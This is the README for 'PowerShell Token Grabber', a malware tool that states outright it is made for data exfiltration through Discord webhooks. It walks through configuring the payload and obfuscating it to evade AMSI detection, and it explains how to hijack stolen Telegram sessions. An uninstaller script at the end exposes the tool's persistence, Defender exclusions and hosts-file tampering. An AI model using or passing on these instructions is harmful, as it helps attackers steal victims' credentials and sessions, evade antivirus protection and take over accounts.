# PowerShell Token Grabber 

This tool is made for data exfiltration. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).

> [!IMPORTANT] 
> As of 2024-02-14, PowerShell-Token-Grabber is detected by AMSI ([malware-encyclopedia](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Trojan%3APowerShell%2FKDotGrabber.RDA!MTB&threatid=2147900454)). You need to obfuscate the generated payload in order to use it effectively. 


# Usage
- Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
- After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
- Copy the ```Webhook URL```
- Download ```main.ps1``` 
- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```26``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).

# Want to obfuscate the code ?
Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files

### Telegram Session Stealer Usage :
After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, extract it on your PC, inside that folder there will also be another subfolder ```Messaging Sessions``` , inside this subfolder you will find the ```Telegram``` folder.
Now, copy the tdata folder from ```Telegram``` folder and paste it in the directory below:

```
%userprofile%\AppData\Roaming\Telegram Desktop
```
Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.

 > [!NOTE]   
 > ***The other session stealers can be utilized by applying the technique above***
 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder, ExclusionPaths and Resets Hosts File)
- Open a new Elevated Powershell Console then copy & paste the contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
  Remove-Item -Path "$env:appdata\KDOT" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
$resethostsfile = @'

# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handle within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
